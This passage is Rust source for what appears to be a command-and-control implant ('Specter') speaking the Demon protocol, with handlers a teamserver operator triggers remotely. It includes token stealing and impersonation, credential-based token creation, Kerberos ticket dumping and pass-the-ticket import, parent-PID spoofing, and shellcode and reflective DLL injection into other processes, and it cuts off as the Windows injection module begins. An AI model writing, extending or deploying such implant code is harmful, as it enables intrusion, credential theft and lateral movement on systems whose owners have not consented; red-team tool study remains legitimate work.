    if let Ok(output) = SysCommand::new("who").stdout(Stdio::piped()).stderr(Stdio::null()).output()
    {
        let text = String::from_utf8_lossy(&output.stdout);
        for line in text.lines() {
            let parts: Vec<&str> = line.split_whitespace().collect();
            if parts.len() >= 2 {
                sessions.push(NetSession {
                    client: parts.get(1).unwrap_or(&"").to_string(),
                    user: parts.first().unwrap_or(&"").to_string(),
                    active_secs: 0,
                    idle_secs: 0,
                });
            }
        }
    }
    sessions
}

/// Enumerate network shares (Linux: currently returns empty).
fn platform_shares() -> Vec<NetShare> {
    // On Windows this would call NetShareEnum.  On Linux there is no direct
    // equivalent without Samba — return an empty list.
    Vec::new()
}

/// Enumerate local groups from `/etc/group`.
fn platform_groups() -> Vec<NetGroup> {
    let mut groups = Vec::new();
    if let Ok(content) = std::fs::read_to_string("/etc/group") {
        for line in content.lines() {
            if line.starts_with('#') || line.is_empty() {
                continue;
            }
            let parts: Vec<&str> = line.splitn(4, ':').collect();
            if let Some(name) = parts.first() {
                groups.push(NetGroup { name: (*name).to_string(), description: String::new() });
            }
        }
    }
    groups
}

/// Enumerate local users from `/etc/passwd`.
fn platform_users() -> Vec<NetUser> {
    let mut users = Vec::new();
    if let Ok(content) = std::fs::read_to_string("/etc/passwd") {
        for line in content.lines() {
            if line.starts_with('#') || line.is_empty() {
                continue;
            }
            let parts: Vec<&str> = line.splitn(4, ':').collect();
            if let Some(name) = parts.first() {
                // UID 0 = root = admin equivalent
                let uid: u32 = parts.get(2).and_then(|s| s.parse().ok()).unwrap_or(u32::MAX);
                users.push(NetUser { name: (*name).to_string(), is_admin: uid == 0 });
            }
        }
    }
    users
}

// ─── COMMAND_TOKEN (40) ─────────────────────────────────────────────────────

/// Dispatch a `CommandToken` task to the appropriate token sub-handler.
///
/// Incoming payload (LE): `[subcommand: u32][subcommand-specific args…]`
fn handle_token(payload: &[u8], vault: &mut TokenVault) -> DispatchResult {
    let mut offset = 0;
    let subcmd_raw = match parse_u32_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("CommandToken: failed to parse subcommand: {e}");
            return DispatchResult::Ignore;
        }
    };

    let subcmd = match DemonTokenCommand::try_from(subcmd_raw) {
        Ok(c) => c,
        Err(_) => {
            warn!(subcmd_raw, "CommandToken: unknown subcommand");
            return DispatchResult::Ignore;
        }
    };

    info!(subcommand = ?subcmd, "CommandToken dispatch");

    let rest = &payload[offset..];
    match subcmd {
        DemonTokenCommand::Impersonate => handle_token_impersonate(subcmd_raw, rest, vault),
        DemonTokenCommand::Steal => handle_token_steal(subcmd_raw, rest, vault),
        DemonTokenCommand::List => handle_token_list(subcmd_raw, vault),
        DemonTokenCommand::PrivsGetOrList => handle_token_privs(subcmd_raw, rest),
        DemonTokenCommand::Make => handle_token_make(subcmd_raw, rest, vault),
        DemonTokenCommand::GetUid => handle_token_getuid(subcmd_raw),
        DemonTokenCommand::Revert => handle_token_revert(subcmd_raw, vault),
        DemonTokenCommand::Remove => handle_token_remove(subcmd_raw, rest, vault),
        DemonTokenCommand::Clear => handle_token_clear(subcmd_raw, vault),
        DemonTokenCommand::FindTokens => handle_token_find(subcmd_raw),
    }
}

/// `COMMAND_TOKEN / Impersonate (1)` — impersonate a vault token by ID.
///
/// Incoming args (LE): `[token_id: u32]`
/// Outgoing payload (LE): `[subcmd: u32][success: u32][domain_user: wstring]`
fn handle_token_impersonate(
    subcmd_raw: u32,
    rest: &[u8],
    vault: &mut TokenVault,
) -> DispatchResult {
    use crate::token::native;

    let mut offset = 0;
    let token_id = match parse_u32_le(rest, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("Token::Impersonate: failed to parse token_id: {e}");
            return DispatchResult::Ignore;
        }
    };

    let mut out = Vec::new();
    write_u32_le(&mut out, subcmd_raw);

    let entry = match vault.get(token_id) {
        Some(e) => e,
        None => {
            info!(token_id, "Token::Impersonate: token not found in vault");
            write_u32_le(&mut out, 0); // FALSE
            write_u32_le(&mut out, 0); // empty string length
            return DispatchResult::Respond(Response::new(DemonCommand::CommandToken, out));
        }
    };

    let handle = entry.handle;
    let domain_user = entry.domain_user.clone();

    match native::impersonate_token(handle) {
        Ok(()) => {
            vault.set_impersonating(Some(token_id));
            info!(token_id, user = %domain_user, "Token::Impersonate: success");
            write_u32_le(&mut out, 1); // TRUE
            write_utf16le(&mut out, &domain_user);
        }
        Err(err) => {
            warn!(token_id, error_code = err, "Token::Impersonate: failed");
            write_u32_le(&mut out, 0); // FALSE
            write_u32_le(&mut out, 0);
        }
    }

    DispatchResult::Respond(Response::new(DemonCommand::CommandToken, out))
}

/// `COMMAND_TOKEN / Steal (2)` — steal a token from a target process.
///
/// Incoming args (LE): `[pid: u32][handle: u32]`
/// Outgoing payload (LE): `[subcmd: u32][domain_user: wbytes][token_id: u32][pid: u32]`
fn handle_token_steal(subcmd_raw: u32, rest: &[u8], vault: &mut TokenVault) -> DispatchResult {
    use crate::token::native;

    let mut offset = 0;
    let target_pid = match parse_u32_le(rest, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("Token::Steal: failed to parse pid: {e}");
            return DispatchResult::Ignore;
        }
    };
    let target_handle = match parse_u32_le(rest, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("Token::Steal: failed to parse handle: {e}");
            return DispatchResult::Ignore;
        }
    };

    let entry = match native::steal_token(target_pid, target_handle) {
        Ok(e) => e,
        Err(err) => {
            warn!(target_pid, error_code = err, "Token::Steal: failed");
            return DispatchResult::Ignore;
        }
    };

    let domain_user = entry.domain_user.clone();
    let token_id = vault.add(entry);

    // Auto-impersonate the stolen token.
    if let Err(err) = native::impersonate_token(vault.get(token_id).map_or(0, |e| e.handle)) {
        warn!(token_id, error_code = err, "Token::Steal: impersonate failed");
    } else {
        vault.set_impersonating(Some(token_id));
    }

    info!(token_id, user = %domain_user, pid = target_pid, "Token::Steal: success");

    let mut out = Vec::new();
    write_u32_le(&mut out, subcmd_raw);
    // PackageAddBytes for domain_user (UTF-16LE).
    write_utf16le(&mut out, &domain_user);
    write_u32_le(&mut out, token_id);
    write_u32_le(&mut out, target_pid);

    DispatchResult::Respond(Response::new(DemonCommand::CommandToken, out))
}

/// `COMMAND_TOKEN / List (3)` — list all tokens in the vault.
///
/// Outgoing payload (LE): `[subcmd: u32]` then for each token:
///   `[index: u32][handle: u32][domain_user: wstring][pid: u32][type: u32][impersonating: u32]`
fn handle_token_list(subcmd_raw: u32, vault: &TokenVault) -> DispatchResult {
    let mut out = Vec::new();
    write_u32_le(&mut out, subcmd_raw);

    for (idx, entry) in vault.iter() {
        write_u32_le(&mut out, idx);
        #[allow(clippy::cast_possible_truncation)]
        write_u32_le(&mut out, entry.handle as u32);
        write_utf16le(&mut out, &entry.domain_user);
        write_u32_le(&mut out, entry.process_id);
        write_u32_le(&mut out, entry.token_type as u32);
        write_u32_le(&mut out, u32::from(vault.is_impersonating(idx)));
    }

    info!(count = vault.len(), "Token::List");
    DispatchResult::Respond(Response::new(DemonCommand::CommandToken, out))
}

/// `COMMAND_TOKEN / PrivsGetOrList (4)` — get/list privileges on the current token.
///
/// Incoming args (LE): `[list_privs: u32]` then if `list_privs == 0`: `[priv_name: bytes]`
/// Outgoing payload (LE): `[subcmd: u32][list_privs: u32]` then either:
///   - List:  `[name: bytes][attrs: u32]...`
///   - Get:   `[success: u32][name: bytes]`
fn handle_token_privs(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
    use crate::token::native;

    let mut offset = 0;
    let list_privs = match parse_u32_le(rest, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("Token::PrivsGetOrList: failed to parse list_privs: {e}");
            return DispatchResult::Ignore;
        }
    };

    let mut out = Vec::new();
    write_u32_le(&mut out, subcmd_raw);
    write_u32_le(&mut out, list_privs);

    if list_privs != 0 {
        // List all privileges.
        match native::list_privileges() {
            Ok(privs) => {
                info!(count = privs.len(), "Token::PrivsList");
                for (name, attrs) in &privs {
                    write_bytes_le(&mut out, name.as_bytes());
                    write_u32_le(&mut out, *attrs);
                }
            }
            Err(err) => {
                warn!(error_code = err, "Token::PrivsList: failed");
            }
        }
    } else {
        // Enable a specific privilege.
        let priv_bytes = match parse_bytes_le(&rest[offset..], &mut 0) {
            Ok(b) => b,
            Err(e) => {
                warn!("Token::PrivsGet: failed to parse priv name: {e}");
                return DispatchResult::Ignore;
            }
        };
        let priv_name = String::from_utf8_lossy(&priv_bytes).trim_end_matches('\0').to_string();

        match native::enable_privilege(&priv_name) {
            Ok(success) => {
                info!(privilege = %priv_name, success, "Token::PrivsGet");
                write_u32_le(&mut out, u32::from(success));
                write_bytes_le(&mut out, priv_name.as_bytes());
            }
            Err(err) => {
                warn!(privilege = %priv_name, error_code = err, "Token::PrivsGet: failed");
                write_u32_le(&mut out, 0);
                write_bytes_le(&mut out, priv_name.as_bytes());
            }
        }
    }

    DispatchResult::Respond(Response::new(DemonCommand::CommandToken, out))
}

/// `COMMAND_TOKEN / Make (5)` — create a token via `LogonUserW`.
///
/// Incoming args (LE): `[domain: wbytes][user: wbytes][password: wbytes][logon_type: u32]`
/// Outgoing payload (LE): `[subcmd: u32][domain_user: wstring]`
fn handle_token_make(subcmd_raw: u32, rest: &[u8], vault: &mut TokenVault) -> DispatchResult {
    use crate::token::native;

    let mut offset = 0;

    let domain_bytes = match parse_bytes_le(rest, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!("Token::Make: failed to parse domain: {e}");
            return DispatchResult::Ignore;
        }
    };
    let user_bytes = match parse_bytes_le(rest, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!("Token::Make: failed to parse user: {e}");
            return DispatchResult::Ignore;
        }
    };
    let password_bytes = match parse_bytes_le(rest, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!("Token::Make: failed to parse password: {e}");
            return DispatchResult::Ignore;
        }
    };
    let logon_type = match parse_u32_le(rest, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("Token::Make: failed to parse logon_type: {e}");
            return DispatchResult::Ignore;
        }
    };

    let domain = decode_utf16le_null(&domain_bytes);
    let user = decode_utf16le_null(&user_bytes);
    let password = decode_utf16le_null(&password_bytes);

    let mut out = Vec::new();
    write_u32_le(&mut out, subcmd_raw);

    match native::make_token(&domain, &user, &password, logon_type) {
        Ok(entry) => {
            let domain_user = entry.domain_user.clone();
            let token_id = vault.add(entry);

            // Auto-impersonate the new token.
            if let Err(err) = native::impersonate_token(vault.get(token_id).map_or(0, |e| e.handle))
            {
                warn!(token_id, error_code = err, "Token::Make: impersonate failed");
            } else {
                vault.set_impersonating(Some(token_id));
            }

            info!(token_id, user = %domain_user, "Token::Make: success");
            write_utf16le(&mut out, &domain_user);
        }
        Err(err) => {
            warn!(error_code = err, "Token::Make: LogonUserW failed");
            // Empty response — no user domain on failure.
        }
    }

    DispatchResult::Respond(Response::new(DemonCommand::CommandToken, out))
}

/// `COMMAND_TOKEN / GetUid (6)` — query current identity and elevation status.
///
/// Outgoing payload (LE): `[subcmd: u32][elevated: u32][user: wbytes]`
fn handle_token_getuid(subcmd_raw: u32) -> DispatchResult {
    use crate::token::native;

    let mut out = Vec::new();
    write_u32_le(&mut out, subcmd_raw);

    match native::get_uid() {
        Ok((elevated, user)) => {
            info!(user = %user, elevated, "Token::GetUid");
            write_u32_le(&mut out, u32::from(elevated));
            write_utf16le(&mut out, &user);
        }
        Err(err) => {
            warn!(error_code = err, "Token::GetUid: failed");
            write_u32_le(&mut out, 0);
            write_bytes_le(&mut out, &[]);
        }
    }

    DispatchResult::Respond(Response::new(DemonCommand::CommandToken, out))
}

/// `COMMAND_TOKEN / Revert (7)` — revert to original process token.
///
/// Outgoing payload (LE): `[subcmd: u32][success: u32]`
fn handle_token_revert(subcmd_raw: u32, vault: &mut TokenVault) -> DispatchResult {
    use crate::token::native;

    let mut out = Vec::new();
    write_u32_le(&mut out, subcmd_raw);

    match native::revert_to_self() {
        Ok(()) => {
            vault.set_impersonating(None);
            info!("Token::Revert: success");
            write_u32_le(&mut out, 1); // TRUE
        }
        Err(err) => {
            warn!(error_code = err, "Token::Revert: failed");
            write_u32_le(&mut out, 0); // FALSE
        }
    }

    DispatchResult::Respond(Response::new(DemonCommand::CommandToken, out))
}

/// `COMMAND_TOKEN / Remove (8)` — remove a token from the vault by ID.
///
/// Incoming args (LE): `[token_id: u32]`
/// Outgoing payload (LE): `[subcmd: u32][success: u32][token_id: u32]`
fn handle_token_remove(subcmd_raw: u32, rest: &[u8], vault: &mut TokenVault) -> DispatchResult {
    use crate::token::native;

    let mut offset = 0;
    let token_id = match parse_u32_le(rest, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("Token::Remove: failed to parse token_id: {e}");
            return DispatchResult::Ignore;
        }
    };

    // Close the underlying handle before removing from vault.
    if let Some(entry) = vault.get(token_id) {
        native::close_token_handle(entry.handle);
    }

    let success = vault.remove(token_id);
    info!(token_id, success, "Token::Remove");

    let mut out = Vec::new();
    write_u32_le(&mut out, subcmd_raw);
    write_u32_le(&mut out, u32::from(success));
    write_u32_le(&mut out, token_id);

    DispatchResult::Respond(Response::new(DemonCommand::CommandToken, out))
}

/// `COMMAND_TOKEN / Clear (9)` — clear all tokens from the vault.
///
/// Outgoing payload (LE): `[subcmd: u32]`
fn handle_token_clear(subcmd_raw: u32, vault: &mut TokenVault) -> DispatchResult {
    use crate::token::native;

    // Close all underlying handles.
    for (_, entry) in vault.iter() {
        native::close_token_handle(entry.handle);
    }

    // Revert impersonation before clearing.
    let _ = native::revert_to_self();

    vault.clear();
    info!("Token::Clear");

    let mut out = Vec::new();
    write_u32_le(&mut out, subcmd_raw);

    DispatchResult::Respond(Response::new(DemonCommand::CommandToken, out))
}

/// `COMMAND_TOKEN / FindTokens (10)` — enumerate tokens available on the system.
///
/// This is a Windows-only advanced capability that scans the system handle table.
/// On non-Windows platforms, it returns `success = 0`.
///
/// Outgoing payload (LE): `[subcmd: u32][success: u32]` then if success:
///   `[count: u32]` then for each token:
///   `[username: wstring][pid: u32][handle: u32][integrity: u32][impersonation: u32][token_type: u32]`
fn handle_token_find(subcmd_raw: u32) -> DispatchResult {
    // FindTokens requires NtQuerySystemInformation(SystemHandleInformation) which
    // is not exposed through windows-sys.  For now, report not-supported so the
    // teamserver knows the sub-command was received but the agent cannot fulfil it.
    //
    // A full implementation would iterate the system handle table, duplicate token
    // handles from other processes, and query their metadata.  This will be added
    // in a follow-up issue once the NT syscall wrappers are available.

    info!("Token::FindTokens: not yet implemented — returning empty");

    let mut out = Vec::new();
    write_u32_le(&mut out, subcmd_raw);
    write_u32_le(&mut out, 0); // success = FALSE

    DispatchResult::Respond(Response::new(DemonCommand::CommandToken, out))
}

// ─── COMMAND_KERBEROS (2550) ────────────────────────────────────────────────

/// Route a `CommandKerberos` task to the appropriate sub-handler.
///
/// Incoming payload (LE): `[subcmd: u32][…sub-handler args…]`
fn handle_kerberos(payload: &[u8]) -> DispatchResult {
    let mut offset = 0;
    let subcmd_raw = match parse_u32_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("CommandKerberos: failed to parse subcommand: {e}");
            return DispatchResult::Ignore;
        }
    };

    let subcmd = match DemonKerberosCommand::try_from(subcmd_raw) {
        Ok(c) => c,
        Err(_) => {
            warn!(subcmd_raw, "CommandKerberos: unknown subcommand");
            return DispatchResult::Ignore;
        }
    };

    info!(subcommand = ?subcmd, "CommandKerberos dispatch");

    let rest = &payload[offset..];
    match subcmd {
        DemonKerberosCommand::Luid => handle_kerberos_luid(subcmd_raw),
        DemonKerberosCommand::Klist => handle_kerberos_klist(subcmd_raw, rest),
        DemonKerberosCommand::Purge => handle_kerberos_purge(subcmd_raw, rest),
        DemonKerberosCommand::Ptt => handle_kerberos_ptt(subcmd_raw, rest),
    }
}

/// `COMMAND_KERBEROS / Luid (0)` — get the current logon session LUID.
///
/// Incoming args: (none)
/// Outgoing payload (LE): `[subcmd: u32][success: u32][high: u32][low: u32]`
fn handle_kerberos_luid(subcmd_raw: u32) -> DispatchResult {
    use crate::kerberos::native;

    let mut out = Vec::new();
    write_u32_le(&mut out, subcmd_raw);

    match native::get_luid() {
        Ok(luid) => {
            write_u32_le(&mut out, 1); // success = TRUE
            write_u32_le(&mut out, luid.high);
            write_u32_le(&mut out, luid.low);
        }
        Err(err) => {
            warn!(error_code = err, "Kerberos::Luid: failed to get LUID");
            write_u32_le(&mut out, 0); // success = FALSE
        }
    }

    DispatchResult::Respond(Response::new(DemonCommand::CommandKerberos, out))
}

/// `COMMAND_KERBEROS / Klist (1)` — list Kerberos tickets.
///
/// Incoming args (LE): `[type: u32][luid: u32 (only if type == 1)]`
///   type 0 = /all (enumerate all sessions), type 1 = /luid (single session)
/// Outgoing payload (LE): `[subcmd: u32][success: u32][session_count: u32][…sessions…]`
fn handle_kerberos_klist(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
    use crate::kerberos::native;

    let mut offset = 0;
    let list_type = match parse_u32_le(rest, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("Kerberos::Klist: failed to parse type: {e}");
            return DispatchResult::Ignore;
        }
    };

    let target_luid = if list_type == 1 {
        match parse_u32_le(rest, &mut offset) {
            Ok(v) => Some(v),
            Err(e) => {
                warn!("Kerberos::Klist: failed to parse target LUID: {e}");
                return DispatchResult::Ignore;
            }
        }
    } else {
        None
    };

    let mut out = Vec::new();
    write_u32_le(&mut out, subcmd_raw);

    match native::klist(target_luid) {
        Ok(sessions) => {
            write_u32_le(&mut out, 1); // success = TRUE
            #[allow(clippy::cast_possible_truncation)]
            write_u32_le(&mut out, sessions.len() as u32);

            for session in &sessions {
                write_utf16le(&mut out, &session.user_name);
                write_utf16le(&mut out, &session.domain);
                write_u32_le(&mut out, session.logon_id_low);
                write_u32_le(&mut out, session.logon_id_high);
                write_u32_le(&mut out, session.session);
                write_utf16le(&mut out, &session.user_sid);
                write_u32_le(&mut out, session.logon_time_low);
                write_u32_le(&mut out, session.logon_time_high);
                write_u32_le(&mut out, session.logon_type);
                write_utf16le(&mut out, &session.auth_package);
                write_utf16le(&mut out, &session.logon_server);
                write_utf16le(&mut out, &session.logon_server_dns_domain);
                write_utf16le(&mut out, &session.upn);

                #[allow(clippy::cast_possible_truncation)]
                write_u32_le(&mut out, session.tickets.len() as u32);

                for ticket in &session.tickets {
                    write_utf16le(&mut out, &ticket.client_name);
                    write_utf16le(&mut out, &ticket.client_realm);
                    write_utf16le(&mut out, &ticket.server_name);
                    write_utf16le(&mut out, &ticket.server_realm);
                    write_u32_le(&mut out, ticket.start_time_low);
                    write_u32_le(&mut out, ticket.start_time_high);
                    write_u32_le(&mut out, ticket.end_time_low);
                    write_u32_le(&mut out, ticket.end_time_high);
                    write_u32_le(&mut out, ticket.renew_time_low);
                    write_u32_le(&mut out, ticket.renew_time_high);
                    write_u32_le(&mut out, ticket.encryption_type);
                    write_u32_le(&mut out, ticket.ticket_flags);
                    write_bytes_le(&mut out, &ticket.ticket_data);
                }
            }
        }
        Err(err) => {
            warn!(error_code = err, "Kerberos::Klist: failed to list tickets");
            write_u32_le(&mut out, 0); // success = FALSE
        }
    }

    DispatchResult::Respond(Response::new(DemonCommand::CommandKerberos, out))
}

/// `COMMAND_KERBEROS / Purge (2)` — purge Kerberos tickets for a LUID.
///
/// Incoming args (LE): `[luid: u32]`
/// Outgoing payload (LE): `[subcmd: u32][success: u32]`
fn handle_kerberos_purge(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
    use crate::kerberos::native;

    let mut offset = 0;
    let target_luid = match parse_u32_le(rest, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("Kerberos::Purge: failed to parse LUID: {e}");
            return DispatchResult::Ignore;
        }
    };

    let mut out = Vec::new();
    write_u32_le(&mut out, subcmd_raw);

    match native::purge(target_luid) {
        Ok(()) => {
            write_u32_le(&mut out, 1); // success = TRUE
        }
        Err(err) => {
            warn!(error_code = err, "Kerberos::Purge: failed to purge tickets");
            write_u32_le(&mut out, 0); // success = FALSE
        }
    }

    DispatchResult::Respond(Response::new(DemonCommand::CommandKerberos, out))
}

/// `COMMAND_KERBEROS / Ptt (3)` — pass-the-ticket (import a Kerberos ticket).
///
/// Incoming args (LE): `[ticket_len: u32][ticket: bytes][luid: u32]`
/// Outgoing payload (LE): `[subcmd: u32][success: u32]`
fn handle_kerberos_ptt(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
    use crate::kerberos::native;

    let mut offset = 0;
    let ticket = match parse_bytes_le(rest, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("Kerberos::Ptt: failed to parse ticket: {e}");
            return DispatchResult::Ignore;
        }
    };
    let target_luid = match parse_u32_le(rest, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("Kerberos::Ptt: failed to parse LUID: {e}");
            return DispatchResult::Ignore;
        }
    };

    let mut out = Vec::new();
    write_u32_le(&mut out, subcmd_raw);

    match native::ptt(&ticket, target_luid) {
        Ok(()) => {
            write_u32_le(&mut out, 1); // success = TRUE
        }
        Err(err) => {
            warn!(error_code = err, "Kerberos::Ptt: failed to import ticket");
            write_u32_le(&mut out, 0); // success = FALSE
        }
    }

    DispatchResult::Respond(Response::new(DemonCommand::CommandKerberos, out))
}

// ─── Process injection handlers ──────────────────────────────────────────────

/// `COMMAND_PROC_PPIDSPOOF (27)` — update the PPID used for spawning child processes.
///
/// The teamserver sends a single u32 containing the desired parent PID.  The
/// agent stores it in config for future use by process-creation APIs that
/// support `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS`.
///
/// Incoming payload (LE): `[ppid: u32]`
///
/// Outgoing payload (LE): `[ppid: u32]`
fn handle_proc_ppid_spoof(payload: &[u8], config: &mut SpecterConfig) -> DispatchResult {
    let mut offset = 0;
    let ppid = match parse_u32_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("ProcPpidSpoof: failed to parse PPID: {e}");
            return DispatchResult::Ignore;
        }
    };

    info!(ppid, "ProcPpidSpoof: updating spoofed parent PID");

    config.ppid_spoof = Some(ppid);

    let mut out = Vec::new();
    write_u32_le(&mut out, ppid);

    DispatchResult::Respond(Response::new(DemonCommand::CommandProcPpidSpoof, out))
}

/// `COMMAND_INJECT_SHELLCODE (24)` — inject shellcode into a process.
///
/// Supports three injection modes:
/// - **Spawn (0)**: create a new suspended process, inject, resume
/// - **Inject (1)**: inject into an existing process by PID
/// - **Execute (2)**: inject into the current process
///
/// On Windows, this uses `VirtualAllocEx` + `WriteProcessMemory` +
/// `CreateRemoteThread` (or NtCreateThreadEx / NtQueueApcThread depending on
/// the requested method).
///
/// On non-Windows platforms, no injection is possible; the handler returns
/// `Failed` status so the teamserver reports the error to the operator.
///
/// Incoming payload (LE):
/// `[way: u32][method: u32][x64: u32][shellcode: bytes][args: bytes][pid: u32 (inject only)]`
///
/// Outgoing payload (LE): `[status: u32]`
fn handle_inject_shellcode(payload: &[u8]) -> DispatchResult {
    let mut offset = 0;

    let way_raw = match parse_u32_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("InjectShellcode: failed to parse way: {e}");
            return inject_status_response(
                DemonCommand::CommandInjectShellcode,
                DemonInjectError::InvalidParam,
            );
        }
    };

    let method = match parse_u32_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("InjectShellcode: failed to parse method: {e}");
            return inject_status_response(
                DemonCommand::CommandInjectShellcode,
                DemonInjectError::InvalidParam,
            );
        }
    };

    let x64 = match parse_u32_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("InjectShellcode: failed to parse x64: {e}");
            return inject_status_response(
                DemonCommand::CommandInjectShellcode,
                DemonInjectError::InvalidParam,
            );
        }
    };

    let shellcode = match parse_bytes_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("InjectShellcode: failed to parse shellcode: {e}");
            return inject_status_response(
                DemonCommand::CommandInjectShellcode,
                DemonInjectError::InvalidParam,
            );
        }
    };

    let _args = match parse_bytes_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("InjectShellcode: failed to parse args: {e}");
            return inject_status_response(
                DemonCommand::CommandInjectShellcode,
                DemonInjectError::InvalidParam,
            );
        }
    };

    let way = DemonInjectWay::try_from(way_raw);

    // For the Inject way, a target PID follows the arguments.
    let target_pid = if matches!(way, Ok(DemonInjectWay::Inject)) {
        match parse_u32_le(payload, &mut offset) {
            Ok(v) => Some(v),
            Err(e) => {
                warn!("InjectShellcode: failed to parse target PID: {e}");
                return inject_status_response(
                    DemonCommand::CommandInjectShellcode,
                    DemonInjectError::InvalidParam,
                );
            }
        }
    } else {
        None
    };

    info!(
        way = way_raw,
        method,
        x64,
        shellcode_len = shellcode.len(),
        target_pid = target_pid.unwrap_or(0),
        "InjectShellcode: dispatching injection"
    );

    let status = inject_shellcode_native(way_raw, method, x64, &shellcode, target_pid);

    inject_status_response(DemonCommand::CommandInjectShellcode, status)
}

/// `COMMAND_INJECT_DLL (22)` — reflectively inject a DLL into a remote process.
///
/// The teamserver provides a reflective loader stub (KaynLdr) and the DLL
/// binary.  The agent opens the target process, allocates memory, writes the
/// loader + DLL, and creates a remote thread at the loader entry point.
///
/// Incoming payload (LE):
/// `[technique: u32][pid: u32][loader: bytes][dll: bytes][params: bytes]`
///
/// Outgoing payload (LE): `[status: u32]`
fn handle_inject_dll(payload: &[u8]) -> DispatchResult {
    let mut offset = 0;

    let technique = match parse_u32_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("InjectDll: failed to parse technique: {e}");
            return inject_status_response(
                DemonCommand::CommandInjectDll,
                DemonInjectError::InvalidParam,
            );
        }
    };

    let pid = match parse_u32_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("InjectDll: failed to parse PID: {e}");
            return inject_status_response(
                DemonCommand::CommandInjectDll,
                DemonInjectError::InvalidParam,
            );
        }
    };

    let loader = match parse_bytes_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("InjectDll: failed to parse loader: {e}");
            return inject_status_response(
                DemonCommand::CommandInjectDll,
                DemonInjectError::InvalidParam,
            );
        }
    };

    let dll = match parse_bytes_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("InjectDll: failed to parse DLL: {e}");
            return inject_status_response(
                DemonCommand::CommandInjectDll,
                DemonInjectError::InvalidParam,
            );
        }
    };

    let params = match parse_bytes_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("InjectDll: failed to parse params: {e}");
            return inject_status_response(
                DemonCommand::CommandInjectDll,
                DemonInjectError::InvalidParam,
            );
        }
    };

    info!(
        technique,
        pid,
        loader_len = loader.len(),
        dll_len = dll.len(),
        params_len = params.len(),
        "InjectDll: reflective DLL injection"
    );

    let status = inject_dll_native(technique, pid, &loader, &dll, &params);

    inject_status_response(DemonCommand::CommandInjectDll, status)
}

/// `COMMAND_SPAWN_DLL (26)` — spawn a new process and reflectively inject a DLL.
///
/// Similar to `CommandInjectDll` but creates a new suspended child process
/// first (using the configured spawn binary), injects the DLL into it, then
/// resumes.
///
/// Incoming payload (LE): `[loader: bytes][dll: bytes][args: bytes]`
///
/// Outgoing payload (LE): `[status: u32]`
fn handle_spawn_dll(payload: &[u8]) -> DispatchResult {
    let mut offset = 0;

    let loader = match parse_bytes_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("SpawnDll: failed to parse loader: {e}");
            return inject_status_response(
                DemonCommand::CommandSpawnDll,
                DemonInjectError::InvalidParam,
            );
        }
    };

    let dll = match parse_bytes_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("SpawnDll: failed to parse DLL: {e}");
            return inject_status_response(
                DemonCommand::CommandSpawnDll,
                DemonInjectError::InvalidParam,
            );
        }
    };

    let args = match parse_bytes_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("SpawnDll: failed to parse args: {e}");
            return inject_status_response(
                DemonCommand::CommandSpawnDll,
                DemonInjectError::InvalidParam,
            );
        }
    };

    info!(
        loader_len = loader.len(),
        dll_len = dll.len(),
        args_len = args.len(),
        "SpawnDll: spawn + reflective DLL injection"
    );

    let status = spawn_dll_native(&loader, &dll, &args);

    inject_status_response(DemonCommand::CommandSpawnDll, status)
}

/// Build a single-u32-status injection response payload (LE).
fn inject_status_response(cmd: DemonCommand, status: DemonInjectError) -> DispatchResult {
    let mut out = Vec::new();
    write_u32_le(&mut out, status.into());
    DispatchResult::Respond(Response::new(cmd, out))
}

// ─── Platform-native injection implementations ──────────────────────────────

#[cfg(windows)]
#[allow(unsafe_code)]
mod inject_native {
    use red_cell_common::demon::{DemonInjectError, DemonInjectWay};
    use tracing::{info, warn};

    use windows_sys::Win32::Foundation::{BOOL, CloseHandle, FALSE, INVALID_HANDLE_VALUE};
    use windows_sys::Win32::System::Diagnostics::Debug::WriteProcessMemory;
    use windows_sys::Win32::System::Memory::{
        MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE, VirtualAllocEx,
        VirtualProtectEx,
    };
    use windows_sys::Win32::System::Threading::{
        CREATE_NO_WINDOW, CREATE_SUSPENDED, CreateProcessW, CreateRemoteThread, OpenProcess,
        PROCESS_CREATE_THREAD, PROCESS_INFORMATION, PROCESS_QUERY_INFORMATION,
        PROCESS_VM_OPERATION, PROCESS_VM_WRITE, ResumeThread, STARTUPINFOW, TerminateProcess,
    };

    /// Inject shellcode using the specified way and method.
    pub fn inject_shellcode(
        way: u32,
        _method: u32,
        _x64: u32,
        shellcode: &[u8],
        target_pid: Option<u32>,
    ) -> DemonInjectError {
